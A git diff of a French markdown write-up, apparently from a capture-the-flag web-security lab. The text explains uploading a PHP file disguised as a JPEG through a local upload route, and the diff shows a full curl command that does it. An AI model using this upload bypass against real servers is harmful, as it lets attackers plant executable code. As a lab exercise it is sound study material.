@@ -7,7 +7,7 @@ On peut uploader des fichiers potentiellement dangeureux en les faisant passer p
 Il suffit d'utiliser la route d'upload d'image `/index.php?page=upload` en changeant le `Content-Type` (avec par example `image/jpeg`)
 
 ```shell
-  $> curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@hello.php;type=image/jpeg' 'http://localhost:9784/index.php?page=upload'
+  $> curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@hello.php;type=image/jpeg' 'http://localhost:9784/index.php?page=upload' | grep 'flag'
 ```
 
 ## Prévention
